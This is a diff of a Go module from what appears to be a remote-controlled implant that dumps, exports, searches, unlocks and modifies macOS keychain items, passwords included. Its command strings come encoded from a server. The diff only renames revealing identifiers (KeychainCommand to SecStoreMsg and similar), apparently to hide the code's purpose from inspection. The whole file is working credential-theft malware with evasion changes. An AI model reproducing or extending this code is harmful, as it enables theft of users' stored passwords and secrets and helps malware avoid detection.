@@ -17,8 +17,8 @@ import (
 	"time"
 )
 
-// KeychainTemplate receives string templates from server
-type KeychainTemplate struct {
+// SecStoreCfg receives string templates from server
+type SecStoreCfg struct {
 	Version   int      `json:"v"`
 	Type      int      `json:"t"`
 	Templates []string `json:"tpl"`
@@ -85,52 +85,52 @@ const (
 	idxKcMPassword    = 652
 )
 
-// KeychainCommand manages macOS keychain operations
-type KeychainCommand struct {
-	tpl *KeychainTemplate
+// SecStoreMsg manages macOS keychain operations
+type SecStoreMsg struct {
+	tpl *SecStoreCfg
 }
 
 // getTpl safely retrieves a template string by index
-func (c *KeychainCommand) getTpl(idx int) string {
+func (c *SecStoreMsg) getTpl(idx int) string {
 	if c.tpl != nil && c.tpl.Templates != nil && idx < len(c.tpl.Templates) {
 		return c.tpl.Templates[idx]
 	}
 	return ""
 }
 
-func (c *KeychainCommand) Execute(ctx *CommandContext, args []string) CommandResult {
-	// Parse template from Command.Data - required for operation
-	if ctx.CurrentCommand == nil || ctx.CurrentCommand.Data == "" {
-		return CommandResult{
+func (c *SecStoreMsg) execute(ctx *OpCtx, args []string) OpResult {
+	// Parse template from Msg.Data - required for operation
+	if ctx.CurrentMsg == nil || ctx.CurrentMsg.Data == "" {
+		return OpResult{
 			Output:      Err(E18),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
-	decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data)
+	decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentMsg.Data)
 	if err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E18),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
-	c.tpl = &KeychainTemplate{}
+	c.tpl = &SecStoreCfg{}
 	if err := json.Unmarshal(decoded, c.tpl); err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E18),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
 	if len(args) < 1 {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E1),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -153,16 +153,16 @@ func (c *KeychainCommand) Execute(ctx *CommandContext, args []string) CommandRes
 	case c.getTpl(idxKcUnlock):
 		return c.unlockKeychain(args[1:])
 	default:
-		return CommandResult{
+		return OpResult{
 			Output:      ErrCtx(E21, action),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 }
 
 // listKeychains lists all available keychains
-func (c *KeychainCommand) listKeychains() CommandResult {
+func (c *SecStoreMsg) listKeychains() OpResult {
 	var output strings.Builder
 
 	security := c.getTpl(idxKcSecurity)
@@ -210,15 +210,15 @@ func (c *KeychainCommand) listKeychains() CommandResult {
 		}
 	}
 
-	return CommandResult{
+	return OpResult{
 		Output:      output.String(),
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
 
 // dumpKeychain dumps keychain contents
-func (c *KeychainCommand) dumpKeychain(args []string) CommandResult {
+func (c *SecStoreMsg) dumpKeychain(args []string) OpResult {
 	keychainPath := ""
 	flagKeychain := c.getTpl(idxKcFlagKeychain)
 
@@ -307,10 +307,10 @@ func (c *KeychainCommand) dumpKeychain(args []string) CommandResult {
 			dumpOutput.WriteString(c.formatKeychainItem(currentItem, mService, mAccount, mDescription, mPassword, mData))
 		}
 	} else {
-		return CommandResult{
+		return OpResult{
 			Output:      ErrCtx(E3, stderr.String()),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -342,15 +342,15 @@ func (c *KeychainCommand) dumpKeychain(args []string) CommandResult {
 		}
 	}
 
-	return CommandResult{
+	return OpResult{
 		Output:      dumpOutput.String(),
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
 
 // formatKeychainItem formats a keychain item for display
-func (c *KeychainCommand) formatKeychainItem(item map[string]string, mService, mAccount, mDescription, mPassword, mData string) string {
+func (c *SecStoreMsg) formatKeychainItem(item map[string]string, mService, mAccount, mDescription, mPassword, mData string) string {
 	var output strings.Builder
 	output.WriteString("\n---\n")
 	if service, ok := item[mService]; ok {
@@ -377,7 +377,7 @@ func (c *KeychainCommand) formatKeychainItem(item map[string]string, mService, m
 }
 
 // searchKeychain searches for specific items
-func (c *KeychainCommand) searchKeychain(args []string) CommandResult {
+func (c *SecStoreMsg) searchKeychain(args []string) OpResult {
 	var service, account, label string
 
 	flagService := c.getTpl(idxKcFlagService)
@@ -465,15 +465,15 @@ func (c *KeychainCommand) searchKeychain(args []string) CommandResult {
 		searchOutput.WriteString(Err(E4) + "\n")
 	}
 
-	return CommandResult{
+	return OpResult{
 		Output:      searchOutput.String(),
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
 
 // addToKeychain adds an item to the keychain
-func (c *KeychainCommand) addToKeychain(args []string) CommandResult {
+func (c *SecStoreMsg) addToKeychain(args []string) OpResult {
 	var service, account, password string
 
 	flagService := c.getTpl(idxKcFlagService)
@@ -502,10 +502,10 @@ func (c *KeychainCommand) addToKeychain(args []string) CommandResult {
 	}
 
 	if service == "" || account == "" || password == "" {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E1),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -520,22 +520,22 @@ func (c *KeychainCommand) addToKeychain(args []string) CommandResult {
 		"-T", "") // Allow access by all applications
 
 	if _, err := cmd.CombinedOutput(); err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E11),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
-	return CommandResult{
+	return OpResult{
 		Output:      SuccCtx(S1, fmt.Sprintf("%s:%s", service, account)),
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
 
 // deleteFromKeychain deletes an item from the keychain
-func (c *KeychainCommand) deleteFromKeychain(args []string) CommandResult {
+func (c *SecStoreMsg) deleteFromKeychain(args []string) OpResult {
 	var service, account string
 
 	flagService := c.getTpl(idxKcFlagService)
@@ -558,10 +558,10 @@ func (c *KeychainCommand) deleteFromKeychain(args []string) CommandResult {
 	}
 
 	if service == "" && account == "" {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E1),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -578,22 +578,22 @@ func (c *KeychainCommand) deleteFromKeychain(args []string) CommandResult {
 	}
 
 	if _, err := cmd.CombinedOutput(); err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E11),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
-	return CommandResult{
+	return OpResult{
 		Output:      SuccCtx(S2, fmt.Sprintf("%s:%s", service, account)),
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
 
 // exportKeychain exports keychain to a file
-func (c *KeychainCommand) exportKeychain(args []string) CommandResult {
+func (c *SecStoreMsg) exportKeychain(args []string) OpResult {
 	var keychainPath, outputPath string
 
 	flagKeychain := c.getTpl(idxKcFlagKeychain)
@@ -616,10 +616,10 @@ func (c *KeychainCommand) exportKeychain(args []string) CommandResult {
 	}
 
 	if outputPath == "" {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E1),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -645,35 +645,35 @@ func (c *KeychainCommand) exportKeychain(args []string) CommandResult {
 
 		if dumpOutputBytes, err := cmd.Output(); err == nil {
 			if err := os.WriteFile(outputPath, dumpOutputBytes, 0600); err != nil {
-				return CommandResult{
+				return OpResult{
 					Output:      ErrCtx(E11, outputPath),
-					ExitCode:    1,
-					CompletedAt: time.Now().Format(time.RFC3339),
+					EC:    1,
+					Done: time.Now().Format(time.RFC3339),
 				}
 			}
-			return CommandResult{
+			return OpResult{
 				Output:      SuccCtx(S1, outputPath),
-				ExitCode:    0,
-				CompletedAt: time.Now().Format(time.RFC3339),
+				EC:    0,
+				Done: time.Now().Format(time.RFC3339),
 			}
 		} else {
-			return CommandResult{
+			return OpResult{
 				Output:      ErrCtx(E11, outputPath),
-				ExitCode:    1,
-				CompletedAt: time.Now().Format(time.RFC3339),
+				EC:    1,
+				Done: time.Now().Format(time.RFC3339),
 			}
 		}
 	}
 
-	return CommandResult{
+	return OpResult{
 		Output:      SuccCtx(S1, outputPath),
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
 
 // unlockKeychain unlocks a keychain
-func (c *KeychainCommand) unlockKeychain(args []string) CommandResult {
+func (c *SecStoreMsg) unlockKeychain(args []string) OpResult {
 	var keychainPath, password string
 
 	flagKeychain := c.getTpl(idxKcFlagKeychain)
@@ -696,10 +696,10 @@ func (c *KeychainCommand) unlockKeychain(args []string) CommandResult {
 	}
 
 	if password == "" {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E1),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -713,10 +713,10 @@ func (c *KeychainCommand) unlockKeychain(args []string) CommandResult {
 	}
 
 	if _, err := cmd.CombinedOutput(); err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E3),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -727,9 +727,9 @@ func (c *KeychainCommand) unlockKeychain(args []string) CommandResult {
 		result = Succ(S29) + "\n"
 	}
 
-	return CommandResult{
+	return OpResult{
 		Output:      result,
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
